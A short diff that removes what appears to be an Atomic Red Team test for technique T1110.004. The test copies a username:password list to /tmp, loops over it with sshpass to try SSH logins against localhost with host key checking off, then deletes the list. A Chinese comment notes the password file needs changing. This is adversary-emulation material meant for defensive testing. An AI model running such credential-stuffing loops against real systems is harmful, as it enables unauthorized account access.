@@ -1,6 +1,0 @@
-;需要改下pass文件
-#check
-cp /home/ubuntu/atomic-red-team-master/atomics/T1110.004/src/credstuffuserpass.txt /tmp/
-for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
-#cleanup
-rm -f /tmp/credstuffuserpass.txt
